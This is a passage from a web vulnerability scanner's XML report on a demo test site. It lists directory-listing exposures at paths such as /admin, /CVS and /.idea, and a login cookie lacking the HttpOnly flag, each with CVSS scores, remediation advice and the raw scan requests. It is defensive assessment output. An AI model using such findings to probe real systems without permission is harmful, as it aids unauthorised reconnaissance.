          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="112" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /.idea/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/.idea]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /.idea/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/.idea/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 967
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="113" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /admin/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/admin]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /admin/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/admin/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 278
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="114" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /CVS/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/CVS]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /CVS/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/CVS/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:10 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 611
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="115" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /.idea/scopes/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/.idea/scopes]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /.idea/scopes/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/.idea/scopes/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:25:12 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 300
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="116" color="blue">
       <Name><![CDATA[Cookie(s) without HttpOnly flag set]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Cookies found: <ul><li>Name: login, Domain: testphp.vulnweb.com</li></ul>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[None]]></Impact>
       <Description><![CDATA[This cookie does not have the HTTPOnly flag set. When a cookie is set with the HTTPOnly flag, it instructs the browser that the cookie can only be accessed by the server and not by client-side scripts. This is an important security protection for session cookies.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[If possible, you should set the HTTPOnly flag for this cookie.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET / HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:51 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4096
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
